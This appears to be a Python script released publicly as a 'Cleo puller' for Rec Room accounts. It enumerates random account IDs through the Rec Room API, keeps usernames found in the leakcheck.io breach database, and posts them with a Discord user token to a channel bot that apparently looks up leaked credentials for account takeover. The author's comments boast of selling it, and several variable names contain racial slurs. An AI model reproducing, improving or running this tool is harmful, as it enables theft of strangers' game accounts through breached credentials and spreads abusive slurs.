# Made by PotatoIsCool remade cleo puller for the public I hope yall enjoy
# I tried to make it way cleaner because the old code was 800 lines long so
# This does no include anti debug you will have to make it yourself

#############################################
#                |Updates|
#   1. Removed Anti Debug (300 lines)
#   2. Removed Level checker (250 lines)
#   3. Removed The Discord RPC (50 lines)
#   4. Cleaned the code A LOT
#   5. Removed Blue screen code (20 lines)
#############################################
#                 |Notes|
# I am not perfect with python so the code
# still might be a little messy but I hope
# you guys enjoy it also there will be skids
# Remaking this and selling it DO NOT BUY!!!
#
# I made around 500$ from this easy coded
# program. You will need actual python skills
# If you would like to add the level checker
# into your own cleo puller! Thank you, Potato
#############################################

import requests, colorama, random, time, os, urllib3, threading
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
DomainExpansion = threading.Event()

# Colorama Color Config I use
R = colorama.Fore.RED
B = colorama.Fore.BLUE
P = colorama.Fore.MAGENTA
C = colorama.Fore.CYAN
G = colorama.Fore.GREEN
Y = colorama.Fore.YELLOW

# The basic ass auth I used for cleo puller but I changed it up a little
# I removed the deobfuscation part of this so skids can understand how
# The auth works!
def auth():
    a = "DISCORD WEBHOOK HERE"
    Checking = requests.get(a)
    if Checking.status_code == 200:
        pass
    else:
        print(f"{R}This program has been shutdown by PotatoIsCool. Maybe a update? Go check the Cleo Buyer discord!") # The Note if the program is shut off
        time.sleep(3000)
        os.system("exit")

# This is used to generate random accs
def GenIdNig(year):
    if year == 2016:        # Generates the IDs Below
        RandomID = random.randint(1, 69723)
    elif year == 2017:      # Generates the IDs Below
        RandomID = random.randint(69724,386114)
    elif year == 2018:      # Generates the IDs Below
        RandomID = random.randint(386115, 1290001)
    elif year == 2019:      # Generates the IDs Below
        RandomID = random.randint(1290002, 3314552)
    elif year == 2020:      # Generates the IDs Below
        RandomID = random.randint(3314553,11159631)
    elif year == 2021:      # Generates the IDs Below
        RandomID = random.randint(11159632, 40734808)
    else:
        raise ValueError("Invalid year")
    
    NiggerUrlLMAO = f"https://apim.rec.net/accounts/account/{RandomID}"

    try:
        response = requests.get(NiggerUrlLMAO)
        response.raise_for_status()
        ApiNigerData = response.json()
        return RandomID, ApiNigerData
    # if there is any other status codes that you get dm me and I will update the src
    except requests.exceptions.HTTPError:
        # Most likely ip banned maybe
        if response.status_code == 404:
            return RandomID, None
        
        elif response.status_code == 429:
            DomainExpansion.set()
            time.sleep(5) 
            DomainExpansion.clear()
            return RandomID, None
        
        elif response.status_code == 403:
            # Api failed so its exiting the script
            os.system("Exit")

        else:
            # Api failed so its exiting the script
            os.system("Exit")

    except requests.exceptions.RequestException:
        # Api failed so its exiting the script
        os.system("Exit")

# Checks if the username is in kyanites database
def InLeakCheck(username):
    url = f"https://leakcheck.io/api/public?check={username}"
    Responces = requests.get(url)
    
    if Responces.status_code == 200:
        Stuff = Responces.json()
        if Stuff.get("success", False):
            return Stuff['success']
    return False

# Title of the puller
Cleo = f"""
  /$$$$$$  /$$                           /$$$$$$$            /$$ /$$                    
 /$$__  $$| $$                          | $$__  $$          | $$| $$                    
| $$  \__/| $$  /$$$$$$   /$$$$$$       | $$  \ $$ /$$   /$$| $$| $$  /$$$$$$   /$$$$$$ 
| $$      | $$ /$$__  $$ /$$__  $$      | $$$$$$$/| $$  | $$| $$| $$ /$$__  $$ /$$__  $$
| $$      | $$| $$$$$$$$| $$  \ $$      | $$____/ | $$  | $$| $$| $$| $$$$$$$$| $$  \__/
| $$    $$| $$| $$_____/| $$  | $$      | $$      | $$  | $$| $$| $$| $$_____/| $$      
|  $$$$$$/| $$|  $$$$$$$|  $$$$$$/      | $$      |  $$$$$$/| $$| $$|  $$$$$$$| $$      
 \______/ |__/ \_______/ \______/       |__/       \______/ |__/|__/ \_______/|__/      

Made By {G}PotatoIsCool | Tato | PotatoIsCool.com
"""

def CleoPuller():
    # Logging to make sure function was ran!
    print(f"{G}Starting Puller!")
    print(colorama.Fore.BLUE + Cleo)
    
    #Asking user if for there info!
    DisAccToken = input(f"{P}Enter Discord Token: ")
    channelUrlId = int(input(f"{P}Enter Discord Channel ID: "))
    Timer = int(input(f"{P}Enter delay: "))
    year = int(input(f"{P}Enter the year you like to generate IDs for (2016, - 2021): "))
    #level = (input(f"{P}Enter Level you want (Enter Nothing for no level >.<): ")) Remove the note if you want to have a level

    # Making sure the discord token is a valid discord token
    headers = {"Authorization": f"{DisAccToken}",'Accept': '*/*','Accept-Language': 'es-ES,es;q=0.9','Connection': 'keep-alive','Referer': 'https://discord.com/','Sec-Fetch-Dest': 'empty','Sec-Fetch-Mode': 'cors','Sec-Fetch-Site': 'same-origin','Sec-GPC': '1','User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36','X-Track': 'eyJvcyI6IklPUyIsImJyb3dzZXIiOiJTYWZlIiwic3lzdGVtX2xvY2FsZSI6ImVuLUdCIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKElQaG9uZTsgQ1BVIEludGVybmFsIFByb2R1Y3RzIFN0b3JlLCBhcHBsaWNhdGlvbi8yMDUuMS4xNSAoS0hUTUwpIFZlcnNpb24vMTUuMCBNb2JpbGUvMTVFMjQ4IFNhZmFyaS82MDQuMSIsImJyb3dzZXJfdmVyc2lvbiI6IjE1LjAiLCJvc192IjoiIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfZG9tYWluX2Nvb2tpZSI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjk5OTksImNsaWVudF9ldmVudF9zb3VyY2UiOiJzdGFibGUiLCJjbGllbnRfZXZlbnRfc291cmNlIjoic3RhYmxlIn0'}
    user = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
    if user.status_code == 200:
        pass
    else:
        print(f"{R}ERROR: Acc token invalid maybe?")
        time.sleep(999)
        os.system("exit")
    
    # Code I used for the logger! 
    # there is no reason to have the function there remove it if you are remaking CleoPuller
    def logger():
        """user = requests.get("https://discord.com/api/v9/users/@me", headers=headers).json()
        DiscordUsername = user['username']
        displayUsername = user['global_name']
        if LevelSet:
            payload = {"content": f"@{DiscordUsername} | {displayUsername} is using Cleo Puller Details: | Delay: {Timer} | Year: {year} | Level: {level}"}
        else:
            payload = {"content": f"@{DiscordUsername} | {displayUsername} is using Cleo Puller Details: | Delay: {Timer} | Year: {year}"}
        requests.post(PublicLogs, json=payload)"""

    DontDelay = True
    while True:
        if DontDelay:
            pass
            DontDelay = False
        else:
            time.sleep(Timer)

        RandomID, ApiNigerStuff = GenIdNig(year)
        
        if RandomID is None:
            print(f"{R}ERROR: code 12") # cant generate a id (How the fuck did you get this??
            DontDelay = True
            continue
        
        if ApiNigerStuff is None:
            DontDelay = True
            continue
        
        username = ApiNigerStuff.get('username', 'Unknown Username')
        
        if 'Guest-' in username: # Checks if the username starts with Guest- if it does it doesnt try to pull it
            print(f"{Y}Skipping accs that are impossible to pull (Most likely a guest acc)")
            DontDelay = True
            continue

        if 'User-' in username: # Checks if the username starts with User- if it does it doesnt try to pull it
            print(f"{Y}Skipping accs that are impossible to pull (Most likely a guest acc)")
            DontDelay = True
            continue
        
        # Checks if it is in the kyanite database
        if not InLeakCheck(username):
            print(f"{P}skipping '{username}'")
            DontDelay = True
            continue
        
        # The message its gonna send to the channel
        MsgInfoShit = f"-check {username}"
        
        Duscird = f"https://discord.com/api/v9/channels/{channelUrlId}/messages"
        payload = {"content": MsgInfoShit}
        
        requests.post(Duscird, headers=headers, json=payload)
        print(f"{G}Pulling you fwippin hacker Account: {username}")

# Remove the notes below if you want to add auth to your program
# Also make sure to set your webhook on line 41
#auth()
CleoPuller()